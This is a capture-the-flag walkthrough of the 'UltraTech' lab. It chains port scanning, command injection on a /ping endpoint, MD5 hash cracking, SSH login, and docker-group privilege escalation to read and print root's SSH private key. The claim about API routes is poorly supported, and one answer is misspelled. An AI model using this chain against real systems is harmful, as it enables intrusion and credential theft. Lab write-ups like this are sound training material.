---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Deploy the machine
### Deploy the machine

### No answer needed

&nbsp;

## Task 2: It's enumeration time!
### Which software is using the port 8081?

First, let's run a simple `nmap` scan to see the open ports.
```
$ nmap -p- 10.10.26.63 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 10:18 IST
Warning: 10.10.26.63 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.26.63
Host is up (0.13s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
5945/tcp  filtered unknown
8081/tcp  open     blackice-icecap
13012/tcp filtered unknown
13146/tcp filtered unknown
14464/tcp filtered unknown
25132/tcp filtered unknown
26517/tcp filtered unknown
28167/tcp filtered unknown
29393/tcp filtered unknown
31331/tcp open     unknown
52117/tcp filtered unknown
52621/tcp filtered unknown
59562/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 826.80 seconds
```
Now we can run another `nmap` scan on only the ports that are open.
```
$ nmap -p 21,22,8081,31331 -A 10.10.26.63
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 11:02 IST
Nmap scan report for 10.10.26.63
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
```
There are four open ports:

| Port  | Service |
| :-: | :-: |
| 21    | ftp        |
| 22    |    ssh     |
| 8081  |  http    (node.js)   |
| 31331 |   http (apache)     |

The service running on port 8081 is Node.js.
### Answer
```
Node.js
```

&nbsp;

### Which other non-standard port is used?
31331 is the other non-standard port.
### Answer
```
31331
```

&nbsp;

### Which software using this port?
The software on port 31331 is Apache.
### Answer
```
Apaache
```

&nbsp;

### Which GNU/Linux distribution seems to be used?
The GNU/Linux distribution is Ubuntu.
### Answer
```
Ubuntu
```

&nbsp;

### The software using the port 8081 is a REST api, how many of its routes are used by the web application?
We can see that two routes are being used by the application.
```
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
```
### Answer
```
2
```

&nbsp;

## Task 3: Let the fun begin
### There is a database lying around, what is its filename?
We can brute force the web pages on the `8081` port using `gobuster`.
```
$ gobuster dir -u http://10.10.26.63:8081 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.26.63:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```
Let's go to the `/ping` page.

![6](https://github.com/Knign/Write-ups/assets/110326359/790246d9-fea6-4f8c-b1ab-8ff375dc5d3c)

So we are expected to provide a parameter and we haven't done that we get the errors.
Let's try providing an IP address.

![7](https://github.com/Knign/Write-ups/assets/110326359/ee6d6ca6-8bb9-4d32-a4f5-787edaa2331d)

So the application executes the ping command with the IP we provide.
Let's see if it can execute a command that we provide.

![8](https://github.com/Knign/Write-ups/assets/110326359/019cff8e-33f5-4b3c-acbd-07668ce23cbf)

It does and we get the server name.
### Answer
```
utech.db.sqlite
```

&nbsp;

### What is the first user's password hash?
We can read the passwords from the database using `cat`.

![9](https://github.com/Knign/Write-ups/assets/110326359/b139abb0-f5d5-4d72-904a-471a12e7572b)

We get two password hashes, one of `r00t` user and one of `admin` user.

| r00t |  admin     |
| :-: | :-: |
| f357a0c52799563c7c7b76c1e7543a32  | 0d0ea5111e3c1def594c1684e3b9be84 |

### Answer
```
f357a0c52799563c7c7b76c1e7543a32
```

&nbsp;

### What is the password associated with this hash?
Let's use `hash-identifier` to identify the hash type.
```
$ hash-identifier f357a0c52799563c7c7b76c1e7543a32                     
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
We can now crack the hash using `john`.
```
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt password_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
n100906             (?)     
1g 0:00:00:00 DONE (2023-12-08 21:44) 5.000g/s 862080p/s 862080c/s 862080C/s erinbear..eagames
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
### Answer
```
n100906
```

&nbsp;

## Task 4: The root of all evil
### What are the first 9 characters of the root user's private SSH key?
We can try logging in through SSH using the `r00t` user and `n100906` password.
```
$ ssh r00t@10.10.26.63             
r00t@10.10.26.63's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 10 10:15:49 UTC 2023

  System load:  0.04               Processes:           102
  Usage of /:   24.4% of 19.56GB   Users logged in:     0
  Memory usage: 73%                IP address for eth0: 10.10.26.63
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

1 package can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Dec 10 09:44:13 2023 from 10.17.48.138
r00t@ultratech-prod:~$
```
Let's check what `sudo` commands the `r00t` user can run.
```
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```
Looks like we will have to find another way.
If we run `id`, we can see that we are part of the `docker` group. 
```
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ which docker
/usr/bin/docker
r00t@ultratech-prod:~$ ls -l /usr/bin/docker
-rwxr-xr-x 1 root root 68631952 Feb 13  2019 /usr/bin/docker
```
Let's check the containers present.
```
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        4 years ago         15.8MB
```
We can see that there is a `bash` container.
We can find an exploit for it on GTFOBins.

![10](https://github.com/Knign/Write-ups/assets/110326359/8cc1208e-e473-4d8d-ac57-0d16f3adf421)

```
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@78c7562da81f:/# 
```
We are now the `root` user.
Let's check the contents of the `root` directory.
```
root@78c7562da81f:/# ls -la /root
total 40
drwx------  6 root root 4096 Mar 22  2019 .
drwxr-xr-x 23 root root 4096 Mar 19  2019 ..
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
```
The private key is has to be inside the `.ssh` directory.
Let's verify the fact.
```
root@78c7562da81f:/# ls -la /root/.ssh        
total 16
drwx------ 2 root root 4096 Mar 22  2019 .
drwx------ 6 root root 4096 Mar 22  2019 ..
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
```
We can now `cat` out the private key.
```
root@78c7562da81f:/# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```
### Answer
```
MIIEogIBA
```
